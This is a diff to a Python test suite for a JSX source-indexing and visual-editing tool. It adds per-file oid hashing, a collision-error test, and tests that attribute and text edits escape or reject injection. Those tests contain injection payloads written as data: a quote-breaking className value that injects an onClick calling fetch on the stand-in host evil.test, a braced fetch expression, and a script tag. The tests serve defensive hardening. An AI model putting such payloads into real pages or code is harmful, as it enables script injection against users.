@@ -46,13 +46,15 @@ def make_workspace(tmp_path: Path, content: str = PAGE_TSX) -> Path:
 @requires_tree_sitter
 class TestOidDerivation:
     def test_oid_is_stable(self):
-        assert _oid_for_path((0, 1, 2)) == _oid_for_path((0, 1, 2))
-        assert _oid_for_path((0, 1)) != _oid_for_path((0, 2))
+        assert _oid_for_path("src/a.tsx", (0, 1, 2)) == _oid_for_path("src/a.tsx", (0, 1, 2))
+        assert _oid_for_path("src/a.tsx", (0, 1)) != _oid_for_path("src/a.tsx", (0, 2))
+
+    def test_oid_differs_across_files(self):
+        assert _oid_for_path("src/header.tsx", (0,)) != _oid_for_path("src/footer.tsx", (0,))
 
     def test_oid_ignores_text_siblings(self):
         """Text nodes never count toward the sibling index."""
-        src = b'<main>\n  <h1>Hi</h1>\n  text between\n  <p>P</p>\n</main>'
-        assert _oid_for_path((0,)) != _oid_for_path((1,))
+        assert _oid_for_path("src/page.tsx", (0,)) != _oid_for_path("src/page.tsx", (1,))
 
 
 @requires_tree_sitter
@@ -123,11 +125,55 @@ class TestSourceIndex:
         index = build_source_index(tmp_path)
         assert any(c.name == "Hero" for c in index.components)
 
-    def test_oid_collisions_do_not_double_index(self, tmp_path):
-        make_workspace(tmp_path)
+    def test_two_component_files_index_all_elements_with_distinct_oids(self, tmp_path):
+        """Same structural path in two files must produce distinct oids.
+
+        Reproduction of C1: header.tsx and footer.tsx both root at path ()
+        with an h2 child at (0,). Without the file in the digest, half the
+        index is silently dropped.
+        """
+        src = tmp_path / "src"
+        src.mkdir(parents=True)
+        (src / "header.tsx").write_text(
+            "export default function Header() {\n"
+            "  return (\n"
+            "    <header>\n"
+            "      <h2>Top</h2>\n"
+            "    </header>\n"
+            "  )\n"
+            "}\n",
+            encoding="utf-8",
+        )
+        (src / "footer.tsx").write_text(
+            "export default function Footer() {\n"
+            "  return (\n"
+            "    <footer>\n"
+            "      <h2>Bottom</h2>\n"
+            "    </footer>\n"
+            "  )\n"
+            "}\n",
+            encoding="utf-8",
+        )
         index = build_source_index(tmp_path)
-        ids = list(index.by_oid)
-        assert len(ids) == len(set(ids))
+        tags_files = sorted((e.tag, Path(e.file).name) for e in index.by_oid.values())
+        assert tags_files == [
+            ("footer", "footer.tsx"),
+            ("h2", "footer.tsx"),
+            ("h2", "header.tsx"),
+            ("header", "header.tsx"),
+        ]
+        assert len(index.by_oid) == 4
+        assert len(set(index.by_oid)) == 4
+
+    def test_true_oid_collision_raises(self, tmp_path, monkeypatch):
+        """A genuine digest collision after file is in the hash must raise."""
+        from tools import source_map as sm
+
+        make_workspace(tmp_path)
+        # Force every path to the same oid so the raise path is deterministic.
+        monkeypatch.setattr(sm, "_oid_for_path", lambda *a, **k: "deadbeefcafebabe")
+        with pytest.raises(sm.OidCollisionError, match="oid collision"):
+            build_source_index(tmp_path, use_cache=False)
 
 
 @requires_tree_sitter
@@ -203,14 +249,53 @@ class TestVisualEdit:
         assert "error" in result
         assert (tmp_path / "src" / "page.tsx").read_bytes() == before
 
-    def test_patched_source_must_reparse(self, tmp_path):
+    def test_set_attr_escapes_embedded_quote(self, tmp_path):
+        """A bare quote in an attribute value is escaped via a JSX expression."""
         make_workspace(tmp_path)
         index = build_source_index(tmp_path)
         h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
-        # A value containing an unescaped quote breaks the JSX; the reparse
-        # gate must refuse it.
-        with pytest.raises(EditError, match="does not parse"):
-            _apply_patch(index, h1.oid, "set_attr", "aria-label", 'bad " quote')
+        path, old, new, patched = _apply_patch(
+            index, h1.oid, "set_attr", "aria-label", 'bad " quote'
+        )
+        assert '{"bad \\" quote"}' in new or '={"bad \\" quote"}' in new or new == '{"bad \\" quote"}'
+        assert b'aria-label={"bad \\" quote"}' in patched
+
+    def test_set_class_escapes_quote_injection(self, tmp_path):
+        """H1: a quote in the value must not close the attribute and inject JSX."""
+        make_workspace(tmp_path)
+        index = build_source_index(tmp_path)
+        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
+        payload = 'x" onClick={() => fetch("http://evil.test")} data-y="'
+        path, old, new, patched = _apply_patch(
+            index, h1.oid, "set_class", "className", payload
+        )
+        text = patched.decode()
+        # Expression form keeps the payload as one JS string value.
+        assert 'className={"x\\" onClick={() => fetch(\\"http://evil.test\\")} data-y=\\""}' in text
+        # Re-index: onClick must not be a real attribute on the element.
+        (tmp_path / "src" / "page.tsx").write_bytes(patched)
+        (tmp_path / "src" / "page.tsx").touch()
+        reindexed = build_source_index(tmp_path, use_cache=False)
+        h1_after = next(e for e in reindexed.by_oid.values() if e.tag == "h1")
+        attr_names = [n for n, _, _ in h1_after.attributes]
+        assert "onClick" not in attr_names
+        assert "data-y" not in attr_names
+        assert "className" in attr_names
+
+    def test_set_text_refuses_jsx_expression_injection(self, tmp_path):
+        """H1: set_text must not splice raw JSX expressions into the tree."""
+        make_workspace(tmp_path)
+        index = build_source_index(tmp_path)
+        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
+        with pytest.raises(EditError, match=r"[{}<]"):
+            _apply_patch(index, h1.oid, "set_text", "", '{fetch("http://evil.test")}')
+
+    def test_set_text_refuses_angle_bracket(self, tmp_path):
+        make_workspace(tmp_path)
+        index = build_source_index(tmp_path)
+        h1 = next(e for e in index.by_oid.values() if e.tag == "h1")
+        with pytest.raises(EditError, match=r"[{}<]"):
+            _apply_patch(index, h1.oid, "set_text", "", "<script>x</script>")
 
 
 @requires_tree_sitter
